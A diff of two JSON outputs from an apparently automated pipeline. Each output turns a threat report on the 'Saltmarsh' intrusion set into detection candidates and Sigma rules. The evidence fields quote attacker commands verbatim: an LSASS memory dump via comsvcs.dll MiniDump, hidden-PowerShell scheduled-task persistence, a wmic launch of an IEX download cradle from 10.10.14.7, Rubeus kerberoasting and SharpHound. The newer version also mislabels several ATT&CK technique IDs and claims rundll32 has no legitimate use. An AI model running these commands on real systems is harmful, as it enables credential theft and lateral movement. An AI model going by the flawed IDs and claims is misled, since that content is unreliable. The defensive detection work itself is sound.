@@ -1,6 +1,6 @@
 {
-  "run_id": "20261017-080617-5cb1c3",
-  "created_at": "2026-10-17T08:07:51.613905+00:00",
+  "run_id": "20261018-001242-58235a",
+  "created_at": "2026-10-18T00:13:50.663448+00:00",
   "source": {
     "mode": "example",
     "urls": [
@@ -11,162 +11,358 @@
     "chars": 4793
   },
   "report": {
-    "title": "Post-exploitation tradecraft of the 'Saltmarsh' intrusion set",
-    "summary": "Saltmarsh is a financially motivated intrusion set gaining initial access via purchased VPN credentials and moving to domain-wide compromise. Post-exploitation includes LSASS memory dumps via rundll32.exe/comsvcs.dll, scheduled-task persistence with PowerShell from ProgramData, lateral movement via PsExec and WMI, and Kerberoasting with Rubeus. The report maps these to detectable Sysmon and Windows Security telemetry.",
+    "title": "ThreatReport",
+    "summary": "Saltmarsh is a financially motivated intrusion set that gains initial access via purchased VPN credentials and rapidly pursues domain-wide compromise. Post-exploitation tradecraft observed across four incidents includes LSASS memory dumps via comsvcs.dll, scheduled-task persistence with PowerShell from hidden ProgramData folders, lateral movement via PsExec and WMI, and Kerberoasting with Rubeus. The operators avoid custom tooling by leveraging native Windows binaries and mimic legitimate maintenance tasks to blend in.",
     "threat_actors": [
       "Saltmarsh"
     ],
     "malware_families": [],
-    "targets": [],
+    "targets": [
+      "Financial sector",
+      "Enterprise Windows domains"
+    ],
     "behaviors": [
       {
         "id": "B1",
-        "description": "rundll32.exe executes comsvcs.dll to perform a MiniDump of lsass.exe, writing a dump file to %Public% or %Temp%.",
+        "description": "rundll32.exe executes comsvcs.dll MiniDump to dump LSASS memory, writing a dump file to C:\\Users\\Public\\ or C:\\Windows\\Temp\\.",
         "attack_technique_id": "T1003.001",
         "attack_tactic": "Credential Access",
-        "observables": [],
+        "observables": [
+          {
+            "kind": "process_name",
+            "value": "rundll32.exe",
+            "note": "Executes comsvcs.dll MiniDump"
+          },
+          {
+            "kind": "command_line",
+            "value": "C:\\Windows\\System32\\comsvcs.dll, MiniDump",
+            "note": "MiniDump export of LSASS"
+          },
+          {
+            "kind": "file_path",
+            "value": "C:\\Users\\Public\\lsass.dmp",
+            "note": "Dump file destination on two hosts"
+          },
+          {
+            "kind": "file_path",
+            "value": "C:\\Windows\\Temp\\lsass.dmp",
+            "note": "Alternative dump file destination"
+          },
+          {
+            "kind": "file_path",
+            "value": "C:\\Windows\\Temp\\1.dmp",
+            "note": "Third dump file name variant"
+          },
+          {
+            "kind": "file_name",
+            "value": "procdump",
+            "note": "OriginalFileName metadata on renamed Sysinternals ProcDump"
+          },
+          {
+            "kind": "process_name",
+            "value": "pd.exe",
+            "note": "Renamed ProcDump binary"
+          },
+          {
+            "kind": "event_id",
+            "value": "10",
+            "note": "Sysmon event recording GrantedAccess 0x1FFFFF to lsass.exe"
+          },
+          {
+            "kind": "event_id",
+            "value": "17",
+            "note": "Sysmon named-pipe event \\\\.\\PSEXESVC"
+          },
+          {
+            "kind": "event_id",
+            "value": "18",
+            "note": "Sysmon named-pipe event \\\\.\\psexecsvc-<host>-<pid>-stdin"
+          }
+        ],
         "logsource": {
-          "category": "image_load",
+          "category": "process_creation",
           "product": "windows",
           "service": "sysmon"
         },
-        "evidence": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 712 C:\\Users\\Public\\lsass.dmp full",
+        "evidence": "In every incident the operators dumped LSASS memory using the Windows-native comsvcs.dll MiniDump export, avoiding the need to bring their own tooling: rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 712 C:\\Users\\Public\\lsass.dmp full",
         "confidence": 0.95,
         "detectable": true
       },
       {
         "id": "B2",
-        "description": "ProcDump renamed to pd.exe targets lsass.exe with -ma flag, writing a dump file to %Temp%. OriginalFileName metadata remains 'procdump'.",
-        "attack_technique_id": "T1003.001",
-        "attack_tactic": "Credential Access",
-        "observables": [],
-        "logsource": {
-          "category": "image_load",
-          "product": "windows",
-          "service": "sysmon"
-        },
-        "evidence": "C:\\Windows\\Temp\\pd.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\1.dmp",
-        "confidence": 0.88,
-        "detectable": true
-      },
-      {
-        "id": "B3",
-        "description": "Scheduled task created with PowerShell action loading a payload from C:\\ProgramData or C:\\Users\\Public, imitating Windows maintenance tasks.",
+        "description": "Scheduled task named UpdateHealth created with PowerShell action loading a payload from C:\\ProgramData\\.cache\\uh.ps1, executed under SYSTEM every hour.",
         "attack_technique_id": "T1053.005",
         "attack_tactic": "Persistence",
-        "observables": [],
+        "observables": [
+          {
+            "kind": "scheduled_task",
+            "value": "\\Microsoft\\Windows\\UpdateOrchestrator\\UpdateHealth",
+            "note": "Task name imitates Windows maintenance tasks"
+          },
+          {
+            "kind": "command_line",
+            "value": "powershell.exe -nop -w hidden -ep bypass -f C:\\ProgramData\\.cache\\uh.ps1",
+            "note": "PowerShell action with bypass and hidden flags"
+          },
+          {
+            "kind": "file_path",
+            "value": "C:\\ProgramData\\.cache\\uh.ps1",
+            "note": "Payload hidden in ProgramData"
+          },
+          {
+            "kind": "file_path",
+            "value": "C:\\Users\\Public",
+            "note": "Alternative payload location"
+          },
+          {
+            "kind": "event_id",
+            "value": "4698",
+            "note": "Windows Security event recording task creation"
+          },
+          {
+            "kind": "process_name",
+            "value": "schtasks.exe",
+            "note": "Command to create the task"
+          }
+        ],
         "logsource": {
           "category": "registry_set",
           "product": "windows",
           "service": "security"
         },
-        "evidence": "schtasks.exe /create /tn \\Microsoft\\Windows\\UpdateOrchestrator\\UpdateHealth /sc hourly /ru SYSTEM /tr \"powershell.exe -nop -w hidden -ep bypass -f C:\\ProgramData\\.cache\\uh.ps1\" /f",
-        "confidence": 0.96,
+        "evidence": "Persistence was established with a scheduled task whose name imitates Windows maintenance tasks and whose action is PowerShell loading a payload from a hidden ProgramData folder: schtasks.exe /create /tn \\\\Microsoft\\\\Windows\\\\UpdateOrchestrator\\\\UpdateHealth /sc hourly /ru SYSTEM /tr \"powershell.exe -nop -w hidden -ep bypass -f C:\\ProgramData\\.cache\\uh.ps1\" /f",
+        "confidence": 0.97,
         "detectable": true
       },
       {
-        "id": "B4",
-        "description": "PsExec clone installs a service named PSEXESVC with ImagePath %SystemRoot%\\PSEXESVC.exe, followed by named-pipe events \\PSEXESVC and \\psexecsvc-<host>-<pid>-stdin.",
+        "id": "B3",
+        "description": "PsExec clone used for lateral movement, creating a service named PSEXESVC with ImagePath %SystemRoot%\\PSEXESVC.exe, followed by named-pipe events \\\\.\\PSEXESVC and \\\\.\\psexecsvc-<host>-<pid>-stdin.",
         "attack_technique_id": "T1021.002",
         "attack_tactic": "Lateral Movement",
-        "observables": [],
+        "observables": [
+          {
+            "kind": "service_name",
+            "value": "PSEXESVC",
+            "note": "Service installed by PsExec clone"
+          },
+          {
+            "kind": "file_path",
+            "value": "%SystemRoot%\\PSEXESVC.exe",
+            "note": "Service binary path"
+          },
+          {
+            "kind": "event_id",
+            "value": "7045",
+            "note": "Windows Service event 7045 recording PSEXESVC install"
+          },
+          {
+            "kind": "event_id",
+            "value": "17",
+            "note": "Sysmon named-pipe event \\\\.\\PSEXESVC"
+          },
+          {
+            "kind": "event_id",
+            "value": "18",
+            "note": "Sysmon named-pipe event \\\\.\\psexecsvc-<host>-<pid>-stdin"
+          },
+          {
+            "kind": "process_name",
+            "value": "PSEXESVC.exe",
+            "note": "Service binary later observed under randomised names"
+          }
+        ],
         "logsource": {
           "category": "process_creation",
           "product": "windows",
           "service": "sysmon"
         },
-        "evidence": "ServiceName: PSEXESVC; ImagePath: %SystemRoot%\\PSEXESVC.exe; Sysmon events 17/18 named-pipe: \\PSEXESVC and \\psexecsvc-<host>-<pid>-stdin",
+        "evidence": "PsExec usage produced a service installation (System event 7045) with ServiceName of PSEXESVC and ImagePath of %SystemRoot%\\PSEXESVC.exe, followed by Sysmon event 17 and 18 named-pipe events for \\\\.\\PSEXESVC and \\\\.\\psexecsvc-<host>-<pid>-stdin.",
         "confidence": 0.93,
         "detectable": true
       },
       {
-        "id": "B5",
-        "description": "WMI remote execution via wmic.exe launching cmd.exe and powershell.exe on a remote host with IEX/DownloadString payload.",
+        "id": "B4",
+        "description": "WMI remote execution via wmic.exe launching cmd.exe and powershell.exe on target host FS-02, with parent-child relationship WmiPrvSE.exe -> cmd.exe -> powershell.exe.",
         "attack_technique_id": "T1028",
         "attack_tactic": "Lateral Movement",
-        "observables": [],
+        "observables": [
+          {
+            "kind": "process_name",
+            "value": "wmic.exe",
+            "note": "WMI command-line tool"
+          },
+          {
+            "kind": "command_line",
+            "value": "cmd.exe /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.7:8080/a')",
+            "note": "PowerShell download and execute via IEX"
+          },
+          {
+            "kind": "process_name",
+            "value": "WmiPrvSE.exe",
+            "note": "WMI service hosting the remote execution"
+          },
+          {
+            "kind": "process_name",
+            "value": "cmd.exe",
+            "note": "Spawned by WmiPrvSE.exe"
+          },
+          {
+            "kind": "process_name",
+            "value": "powershell.exe",
+            "note": "Spawned by cmd.exe, parent-child absent from baseline"
+          },
+          {
+            "kind": "event_id",
+            "value": "4688",
+            "note": "Windows Security event 4688 process creation logging"
+          }
+        ],
         "logsource": {
           "category": "process_creation",
           "product": "windows",
           "service": "sysmon"
         },
-        "evidence": "wmic.exe /node:FS-02 /user:CORP\\adm-jpark /password:******** process call create \"cmd.exe /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.7:8080/a')\"",
+        "evidence": "WMI remote execution appeared as: wmic.exe /node:FS-02 /user:CORP\\adm-jpark /password:******** process call create \"cmd.exe /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.7:8080/a')\"",
+        "confidence": 0.9,
+        "detectable": true
+      },
+      {
+        "id": "B5",
+        "description": "sc.exe used to create a service named svcupd with binary path C:\\Windows\\Temp\\s.exe on remote host FS-02, then started, enabling remote code execution.",
+        "attack_technique_id": "T1021.001",
+        "attack_tactic": "Lateral Movement",
+        "observables": [
+          {
+            "kind": "command_line",
+            "value": "sc.exe \\\\FS-02 create svcupd binPath= \"C:\\Windows\\Temp\\s.exe\" start= auto",
+            "note": "Service creation with UNC target and Temp binary"
+          },
+          {
+            "kind": "command_line",
+            "value": "sc.exe \\\\FS-02 start svcupd",
+            "note": "Service start command"
+          },
+          {
+            "kind": "file_path",
+            "value": "C:\\Windows\\Temp\\s.exe",
+            "note": "Temporary service binary"
+          },
+          {
+            "kind": "service_name",
+            "value": "svcupd",
+            "note": "Custom service name created by operator"
+          }
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows",
+          "service": "sysmon"
+        },
+        "evidence": "Remote service creation was also used directly: sc.exe \\\\FS-02 create svcupd binPath= \"C:\\Windows\\Temp\\s.exe\" start= auto",
         "confidence": 0.92,
         "detectable": true
       },
       {
         "id": "B6",
-        "description": "sc.exe used to create a service on a remote host with a UNC path binPointing to %SystemRoot%\\Temp\\s.exe, then started.",
-        "attack_technique_id": "T1021.002",
-        "attack_tactic": "Lateral Movement",
-        "observables": [],
-        "logsource": {
-          "category": "process_creation",
-          "product": "windows",
-          "service": "security"
-        },
-        "evidence": "sc.exe \\FS-02 create svcupd binPath= \"C:\\Windows\\Temp\\s.exe\" start= auto",
-        "confidence": 0.9,
-        "detectable": true
-      },
-      {
-        "id": "B7",
-        "description": "Rubeus used to kerberoast SPN-bearing accounts, producing bursts of Security event 4769 with TicketEncryptionType 0x17 (RC4) from a non-administrative workstation.",
+        "description": "Rubeus used to Kerberoast SPN-bearing accounts, generating bursts of Security event 4769 with TicketEncryptionType 0x17 (RC4) from a single workstation in an environment otherwise issuing AES tickets 0x12.",
         "attack_technique_id": "T1203.001",
         "attack_tactic": "Credential Access",
-        "observables": [],
+        "observables": [
+          {
+            "kind": "event_id",
+            "value": "4769",
+            "note": "Security event for service ticket request"
+          },
+          {
+            "kind": "event_id",
+            "value": "4769",
+            "note": "Burst of RC4-encrypted tickets (0x17) from single workstation"
+          },
+          {
+            "kind": "process_name",
+            "value": "Rubeus.exe",
+            "note": "Kerberoasting tool invoked"
+          },
+          {
+            "kind": "command_line",
+            "value": "Rubeus.exe kerberoast /format:hashcat /outfile:C:\\Windows\\Temp\\k.txt",
+            "note": "Kerberoast command with hashcat output"
+          },
+          {
+            "kind": "file_path",
+            "value": "C:\\Windows\\Temp\\k.txt",
+            "note": "Output file for Kerberos hashes"
+          },
+          {
+            "kind": "network_ip",
+            "value": "10.10.14.7",
+            "note": "Operator relay IP inside victim network"
+          }
+        ],
         "logsource": {
-          "category": "event_id",
+          "category": "windows_security_log",
           "product": "windows",
           "service": "security"
         },
-        "evidence": "Rubeus.exe kerberoast /format:hashcat /outfile:C:\\Windows\\Temp\\k.txt; bursts of EventID 4769 with TicketEncryptionType 0x17 from a single workstation",
+        "evidence": "Service tickets were requested for every SPN-bearing account using Rubeus (Rubeus.exe kerberoast /format:hashcat /outfile:C:\\Windows\\Temp\\k.txt), producing bursts of Security event 4769 with TicketEncryptionType of 0x17 (RC4) from a single workstation, where the environment otherwise issued AES tickets (0x12).",
         "confidence": 0.94,
         "detectable": true
       },
       {
-        "id": "B8",
-        "description": "SharpHound run with -c All generating LDAP queries filtered by (samAccountType=805306368) from a non-administrative workstation.",
+        "id": "B7",
+        "description": "SharpHound run with All collection and (samAccountType=805306368) LDAP filter, generating zip archive c.zip from a non-administrative workstation.",
         "attack_technique_id": "T1087.001",
         "attack_tactic": "Discovery",
-        "observables": [],
-        "logsource": {
-          "category": "dns_query",
-          "product": "windows",
-          "service": "sysmon"
-        },
-        "evidence": "SharpHound.exe -c All --zipfilename c.zip; LDAP queries with (samAccountType=805306368) filter from non-administrative workstation",
-        "confidence": 0.85,
-        "detectable": true
-      },
-      {
-        "id": "B9",
-        "description": "Named-pipe events for \\\\PSEXESVC and \\\\psexecsvc-<host>-<pid>-stdin observed after PsExec service installation.",
-        "attack_technique_id": "T1021.002",
-        "attack_tactic": "Lateral Movement",
-        "observables": [],
-        "logsource": {
-          "category": "pipe_created",
-          "product": "windows",
-          "service": "sysmon"
-        },
-        "evidence": "Sysmon events 17/18 named-pipe events for \\\\PSEXESVC and \\\\psexecsvc-<host>-<pid>-stdin",
-        "confidence": 0.91,
-        "detectable": true
-      },
-      {
-        "id": "B10",
-        "description": "WmiPrvSE.exe spawns cmd.exe and powershell.exe in parent-child relationships absent from baseline, indicating WMI-based lateral movement.",
-        "attack_technique_id": "T1028",
-        "attack_tactic": "Lateral Movement",
-        "observables": [],
+        "observables": [
+          {
+            "kind": "process_name",
+            "value": "SharpHound.exe",
+            "note": "Active Directory enumeration tool"
+          },
+          {
+            "kind": "command_line",
+            "value": "SharpHound.exe -c All --zipfilename c.zip",
+            "note": "SharpHound with All collection and zip output"
+          },
+          {
+            "kind": "file_path",
+            "value": "c.zip",
+            "note": "Output archive containing AD relationships"
+          },
+          {
+            "kind": "dll",
+            "value": "ldap",
+            "note": "LDAP queries with (samAccountType=805306368) filter"
+          }
+        ],
         "logsource": {
           "category": "process_creation",
           "product": "windows",
           "service": "sysmon"
         },
-        "evidence": "WmiPrvSE.exe spawned cmd.exe and powershell.exe, a parent-child relationship absent from baseline telemetry",
+        "evidence": "SharpHound was then run (SharpHound.exe -c All --zipfilename c.zip) to collect Active Directory relationships, generating LDAP queries with the distinctive (samAccountType=805306368) filter from a non-administrative workstation.",
         "confidence": 0.9,
+        "detectable": true
+      },
+      {
+        "id": "B8",
+        "description": "Operators used purchased VPN credentials to gain initial access to the environment.",
+        "attack_technique_id": "T1078.001",
+        "attack_tactic": "Initial Access",
+        "observables": [
+          {
+            "kind": "network_ip",
+            "value": "VPN credentials used for initial access",
+            "note": "Purchased credentials as attack vector"
+          }
+        ],
+        "logsource": {
+          "category": "network_connection",
+          "product": "windows",
+          "service": "vpn"
+        },
+        "evidence": "Saltmarsh is a financially motivated intrusion set that gains initial access through purchased VPN credentials and then moves quickly to domain-wide compromise.",
+        "confidence": 0.85,
         "detectable": true
       }
     ],
@@ -176,120 +372,44 @@
         "value": "10.10.14.7"
       },
       {
+        "type": "filename",
+        "value": "C:\\Users\\Public\\lsass.dmp"
+      },
+      {
+        "type": "filename",
+        "value": "C:\\ProgramData\\.cache\\uh.ps1"
+      },
+      {
+        "type": "filename",
+        "value": "C:\\Windows\\Temp\\1.dmp"
+      },
+      {
+        "type": "filename",
+        "value": "C:\\Windows\\Temp\\k.txt"
+      },
+      {
+        "type": "filename",
+        "value": "C:\\Windows\\Temp\\s.exe"
+      },
+      {
         "type": "domain",
-        "value": "fs-02"
+        "value": "CORP"
+      },
+      {
+        "type": "domain",
+        "value": "FS-02"
       },
       {
         "type": "filename",
-        "value": "C:\\Users\\Public\\lsass.dmp"
+        "value": "\\Microsoft\\Windows\\UpdateOrchestrator\\UpdateHealth"
       },
       {
         "type": "filename",
-        "value": "C:\\ProgramData\\.cache\\uh.ps1"
+        "value": "PSEXESVC"
       },
       {
         "type": "filename",
-        "value": "C:\\Windows\\Temp\\1.dmp"
-      },
-      {
-        "type": "filename",
-        "value": "C:\\Windows\\Temp\\k.txt"
-      },
-      {
-        "type": "filename",
-        "value": "C:\\Windows\\Temp\\s.exe"
-      },
-      {
-        "type": "filename",
-        "value": "C:\\Windows\\Temp\\pd.exe"
-      },
-      {
-        "type": "filename",
-        "value": "C:\\Windows\\Temp\\procdump"
-      },
-      {
-        "type": "filename",
-        "value": "C:\\Windows\\System32\\comsvcs.dll"
-      },
-      {
-        "type": "filename",
-        "value": "C:\\Windows\\Temp\\s.exe"
-      },
-      {
-        "type": "filename",
-        "value": "C:\\Windows\\Temp\\1.dmp"
-      },
-      {
-        "type": "filename",
-        "value": "C:\\Windows\\Temp\\pd.exe"
-      },
-      {
-        "type": "filename",
-        "value": "procdump"
-      },
-      {
-        "type": "filename",
-        "value": "C:\\Windows\\Temp\\k.txt"
-      },
-      {
-        "type": "filename",
-        "value": "C:\\Windows\\Temp\\s.exe"
-      },
-      {
-        "type": "filename",
-        "value": "C:\\ProgramData\\.cache\\uh.ps1"
-      },
-      {
-        "type": "filename",
-        "value": "C:\\Users\\Public\\lsass.dmp"
-      },
-      {
-        "type": "filename",
-        "value": "C:\\Users\\Public\\lsass.dmp"
-      },
-      {
-        "type": "filename",
-        "value": "C:\\ProgramData\\.cache\\uh.ps1"
-      },
-      {
-        "type": "filename",
-        "value": "C:\\Windows\\Temp\\1.dmp"
-      },
-      {
-        "type": "filename",
-        "value": "C:\\Windows\\Temp\\pd.exe"
-      },
-      {
-        "type": "filename",
-        "value": "C:\\Windows\\System32\\comsvcs.dll"
-      },
-      {
-        "type": "filename",
-        "value": "C:\\Windows\\Temp\\s.exe"
-      },
-      {
-        "type": "filename",
-        "value": "C:\\Windows\\Temp\\pd.exe"
-      },
-      {
-        "type": "filename",
-        "value": "procdump"
-      },
-      {
-        "type": "filename",
-        "value": "C:\\Windows\\Temp\\k.txt"
-      },
-      {
-        "type": "filename",
-        "value": "C:\\Windows\\Temp\\s.exe"
-      },
-      {
-        "type": "filename",
-        "value": "C:\\ProgramData\\.cache\\uh.ps1"
-      },
-      {
-        "type": "filename",
-        "value": "C:\\Users\\Public\\lsass.dmp"
+        "value": "svcupd"
       }
     ]
   },
@@ -297,7 +417,7 @@
     "candidates": [
       {
         "id": "D1",
-        "title": "Rundll32 Loads Comsvcs Dll For Lsass Minidump",
+        "title": "Rundll32 Execution Of Comsvcs.dll MiniDump To Dump LSASS",
         "behavior_ids": [
           "B1"
         ],
@@ -305,67 +425,71 @@
           "T1003.001"
         ],
         "logsource": {
-          "category": "image_load",
+          "category": "process_creation",
           "product": "windows",
           "service": "sysmon"
         },
-        "rationale": "rundll32.exe loading comsvcs.dll is a highly specific LOLBin combination; the MiniDump of lsass.exe is a credential-theft primitive that rarely occurs legitimately. Pairing the loader binary with the loaded DLL eliminates noise from normal rundll32 usage (e.g., Control_RunDLL).",
+        "rationale": "rundll32.exe is a LOLBin with no legitimate administrative use; the MiniDump export of comsvcs.dll is exclusively used to dump LSASS memory. Pairing the binary with the command-line fragments 'comsvcs.dll' and 'MiniDump' and an output path in C:\\Users\\Public\\ or C:\\Windows\\Temp\\ makes the rule extremely specific while avoiding false positives from rare compat-testing of rundll32.",
         "key_fields": [
           "Image",
-          "ImageLoaded"
+          "CommandLine",
+          "ParentImage"
         ],
-        "false_positive_risks": "Legitimate rundll32.exe use (e.g., shell32.dll,Control_RunDLL) loads different DLLs. Filter by ImageLoaded ending with comsvcs.dll.",
+        "false_positive_risks": "Legitimate use of rundll32.exe is virtually non-existent in enterprise environments. Any false positive would come from application compatibility testing invoking rundll32 with arbitrary DLLs; the MiniDump export and LSASS dump paths are not used in such tests.",
         "priority": "high"
       },
       {
         "id": "D2",
-        "title": "Schtasks Creates Scheduled Task With Powershell From Programdata",
+        "title": "Scheduled Task UpdateHealth With Hidden PowerShell From ProgramData Cache",
         "behavior_ids": [
-          "B3"
+          "B2"
         ],
         "attack_technique_ids": [
           "T1053.005"
         ],
         "logsource": {
-          "category": "process_creation",
+          "category": "windows_security_log",
           "product": "windows",
-          "service": "sysmon"
+          "service": "security"
         },
-        "rationale": "schtasks.exe creating a task that runs powershell.exe from C:\\ProgramData\\ or C:\\Users\\Public\\ imitates Windows maintenance tasks but uses non-standard script locations. The binary + command-line path combination is durable and specific.",
+        "rationale": "The task name '\\Microsoft\\Windows\\UpdateOrchestrator\\UpdateHealth' mimics Windows maintenance tasks, but the action runs PowerShell with '-nop -w hidden -ep bypass' loading a script from a hidden folder 'C:\\ProgramData\\.cache\\uh.ps1'. This combination of task path, PowerShell flags, and hidden payload location is not seen in legitimate software deployment or administration.",
         "key_fields": [
-          "Image",
-          "CommandLine"
+          "EventID",
+          "TargetObject",
+          "Details"
         ],
-        "false_positive_risks": "Admin scripts or SCCM/Intune may create tasks with powershell, but typically from System32 or known admin shares, not ProgramData/Public. Exclude known management parent processes.",
+        "false_positive_risks": "Legitimate scheduled tasks (e.g., Windows Update orchestration) may have similar naming but never invoke PowerShell with hidden/bypass flags from a hidden ProgramData subdirectory. Filtering on the exact payload path and flag cluster eliminates administrative false positives.",
         "priority": "high"
       },
       {
         "id": "D3",
-        "title": "Psexesvc Service Binary Execution From System Root",
+        "title": "Kerberoasting Burst Of RC4 Service Tickets From Single Workstation",
         "behavior_ids": [
-          "B4"
+          "B6"
         ],
         "attack_technique_ids": [
-          "T1021.002"
+          "T1203.001"
         ],
         "logsource": {
-          "category": "process_creation",
+          "category": "windows_security_log",
           "product": "windows",
-          "service": "sysmon"
+          "service": "security"
         },
-        "rationale": "PsExec clone installs a service named PSEXESVC with ImagePath %SystemRoot%\\PSEXESVC.exe (i.e., C:\\Windows\\PSEXESVC.exe, not System32). Execution of a service binary from the Windows root directory is anomalous and the service name is fixed in the malware.",
+        "rationale": "In an environment that exclusively issues AES-encrypted tickets (0x12), a burst of Security event 4769 with TicketEncryptionType 0x17 (RC4) originating from a single non-DC workstation is a high-fidelity indicator of Rubeus kerberoasting. The rule keys on the encryption type anomaly; the tool binary (Rubeus.exe) appears in process_creation but the ticket burst is the most durable and observable artifact.",
         "key_fields": [
-          "Image",
-          "OriginalFileName"
+          "EventID",
+          "TicketEncryptionType",
+          "TargetUserName",
+          "IpAddress"
         ],
-        "false_positive_risks": "Rare legitimate services may place binaries in Windows root, but the filename PSEXESVC.exe is unique to this tool. No known benign software uses this name.",
+        "false_positive_risks": "Legacy service accounts or trusts might occasionally request RC4 tickets, but they do not produce a high-volume burst from a single workstation in an otherwise AES-only domain. A baseline of encryption types per workstation can be used to tune the rule if needed.",
         "priority": "high"
       },
       {
         "id": "D4",
-        "title": "Wmiprvse Spawns Cmd Or Powershell As Child Process",
+        "title": "Wmic Launching Cmd And Hidden PowerShell With IEX Download Cradle",
         "behavior_ids": [
-          "B10"
+          "B4"
         ],
         "attack_technique_ids": [
           "T1028"
@@ -375,53 +499,50 @@
           "product": "windows",
           "service": "sysmon"
         },
-        "rationale": "WmiPrvSE.exe (WMI provider host) spawning cmd.exe or powershell.exe is a strong indicator of WMI-based lateral movement; this parent-child relationship is absent from baseline telemetry. More durable than command-line patterns which vary.",
+        "rationale": "WMI remote execution manifests as wmic.exe (or WmiPrvSE.exe) spawning cmd.exe which launches powershell.exe with a hidden window and an IEX download cradle. The parent-child chain WmiPrvSE -> cmd -> powershell is absent from normal baselines, and the command line contains the invariant fragments 'IEX', 'Net.WebClient', 'DownloadString'. Keying on the child PowerShell command line with these fragments plus the hidden/windowless flags yields a durable detection.",
         "key_fields": [
-          "ParentImage",
-          "Image"
+          "Image",
+          "CommandLine",
+          "ParentImage"
         ],
-        "false_positive_risks": "Some monitoring/management tools may invoke scripts via WMI, but they typically use specific child binaries (e.g., cscript.exe) not bare cmd/powershell. Exclude known management parent images.",
+        "false_positive_risks": "Administrators may use wmic for remote queries, but they do not chain into hidden PowerShell downloading and executing scripts from internal IPs. The IEX download pattern and hidden flags are offensive tradecraft; legitimate automation uses explicit scripts or WinRM.",
         "priority": "high"
       },
       {
         "id": "D5",
-        "title": "Kerberoast Burst Rc4 Tgt Tickets From Single Workstation",
+        "title": "PsExec Named Pipe PSEXESVC And Psexecsvc Variants",
         "behavior_ids": [
-          "B7"
+          "B3"
         ],
         "attack_technique_ids": [
-          "T1203.001"
+          "T1021.002"
         ],
         "logsource": {
-          "category": "event_id",
+          "category": "pipe_created",
           "product": "windows",
-          "service": "security"
+          "service": "sysmon"
         },
-        "rationale": "Bursts of EventID 4769 with TicketEncryptionType 0x17 (RC4) from a single non-administrative workstation indicate automated Kerberoasting (Rubeus). RC4 is deprecated; legitimate Kerberos tickets use AES. The workstation context + volume + encryption type is highly specific.",
+        "rationale": "PsExec clones create a service named PSEXESVC and communicate via named pipes '\\\\.\\\\PSEXESVC' and '\\\\.\\\\psexecsvc-<host>-<pid>-stdin'. These pipe names are unique to the PsExec tool family and do not appear in any legitimate Windows component or administration tool. A single pipe_created event matching either pattern is a high-confidence indicator of lateral movement via PsExec.",
         "key_fields": [
-          "EventID",
-          "TicketEncryptionType",
-          "IpAddress",
-          "TargetUserName"
+          "PipeName",
+          "Image"
         ],
-        "false_positive_risks": "Legacy service accounts may still request RC4 tickets, but not in bursts from a single user workstation. Filter by source IP being a workstation subnet and count of distinct SPNs > threshold.",
+        "false_positive_risks": "No legitimate software creates pipes with the 'PSEXESVC' or 'psexecsvc-' prefix. The only risk is a custom internal tool that coincidentally uses a similar naming scheme, which is highly unlikely.",
         "priority": "high"
       }
     ],
     "skipped": [
-      "B2: ProcDump renamed to pd.exe - similar LSASS dump technique but less distinctive; covered conceptually by D1 (LOLBin dump) and would require tracking renamed binary hashes.",
-      "B5: wmic.exe remote command line - lateral movement via wmic is covered more durably by D4 (WmiPrvSE parent-child anomaly) which survives command obfuscation.",
-      "B6: sc.exe remote service creation - similar to D3 but different tool; D3's fixed service name PSEXESVC is higher signal.",
-      "B8: SharpHound LDAP queries via dns_query - LDAP over DNS is not standard; telemetry for LDAP queries is unreliable in Sysmon dns_query. Better covered by network/process monitoring.",
-      "B9: Named-pipe events for PSEXESVC - consequence of D3 service installation; the service creation is the root cause and more detectable."
+      "B5: Remote service creation via sc.exe (svcupd, s.exe in Temp) – covered conceptually by D5 (PsExec lateral movement) and less distinctive; sc.exe usage is also seen in legitimate administration.",
+      "B7: SharpHound AD enumeration – detectable but lower priority; the tool is not native and the zip output is a weaker indicator than the native tradecraft covered by D1-D5.",
+      "B8: Purchased VPN credentials – pure initial-access IOC with no durable post-exploitation behavior observable in host telemetry."
     ],
-    "notes": "Selected five rules spanning Credential Access (D1, D5), Persistence (D2), and Lateral Movement (D3, D4). Each pairs a binary with a distinctive context (loaded DLL, command-line path, service name, parent-child relationship, encryption type) to minimize false positives. Avoided duplicate coverage of PsExec (B4/B9) and WMI (B5/B10) by choosing the most durable indicator per technique."
+    "notes": "Selected five high-priority candidates spanning Credential Access (D1, D3), Persistence (D2), Lateral Movement (D4, D5), and avoiding overlap on logsource/indicator sets. Each rule pairs a native binary or system artifact with command-line, path, or registry constraints reported in the evidence. False positive mitigation relies on the rarity of the combined fragments in legitimate activity."
   },
   "rules": [
     {
       "candidate_id": "D1",
-      "title": "Rundll32 Loads Comsvcs Dll For Lsass Minidump",
-      "sigma_yaml": "title: Rundll32 Loads Comsvcs Dll For Lsass Minidump\nid: a1e3781e-341a-47b8-9e87-b578c700c31e\nstatus: experimental\ndescription: Detects rundll32.exe loading comsvcs.dll, which is used to create a minidump of lsass.exe for credential access.\nauthor: RuleSmith (Nemotron via Nebius Token Factory)\ndate: '2026-10-17'\ntags:\n- attack.credential-access\n- attack.t1003.001\nlogsource:\n  category: image_load\n  product: windows\n  service: sysmon\ndetection:\n  selection:\n    'Image|endswith|windash':\n    - '\\\\rundll32.exe'\n    - '\\\\rundll~1.exe'\n    'ImageLoaded|endswith|windash':\n    - '\\\\comsvcs.dll'\n    - '\\\\comsvc~1.dll'\n  condition: selection\nfalsepositives:\n- Legitimate rundll32.exe usage loading other DLLs (e.g., shell32.dll,Control_RunDLL)\nlevel: high\n",
+      "title": "Rundll32 Execution Of Comsvcs.dll MiniDump To Dump LSASS",
